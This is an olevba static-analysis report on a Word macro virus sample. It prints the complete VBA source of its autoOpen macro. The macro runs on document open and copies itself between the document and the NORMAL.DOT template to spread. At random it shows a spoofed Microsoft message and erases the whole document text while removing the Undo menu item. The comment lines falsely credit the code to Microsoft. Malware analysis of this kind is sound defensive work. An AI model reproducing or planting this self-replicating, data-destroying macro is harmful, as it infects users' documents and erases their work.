olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-05a0479310bf3731b2eec6afd56c4f183a9c18c0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-05a0479310bf3731b2eec6afd56c4f183a9c18c0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-05a0479310bf3731b2eec6afd56c4f183a9c18c0 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem WordMacro.MicrosoftWazzu.
Rem © 1997 Microsoft Corporation.

Public Sub MAIN()
Dim DocumentMacro$
Dim GlobalMacro$
Dim MacroFile$
On Error GoTo -1: On Error GoTo ErrWazzu
WordBasic.FileSummaryInfo Update:=1
Dim The As Object: Set The = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo The

DocumentMacro$ = The.Directory + "\" + The.FileName + ":autoOpen"
GlobalMacro$ = "Global:autoOpen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

If MacroFile$ = "NORMAL.DOT" Then
WordBasic.MacroCopy GlobalMacro$, DocumentMacro$, 1
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy DocumentMacro$, GlobalMacro$, 1
End If

If Rnd() < 0.05 Then
WordBasic.MsgBox "Where do you want to go today?", "Microsoft Corporation", 32
End If

If Rnd() < 0.02 Then
WordBasic.EditSelectAll
WordBasic.WW6_EditClear
WordBasic.ToolsCustomizeMenus Name:="EditUndo", Menu:="Edit", Remove:=1
End If

ErrWazzu:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

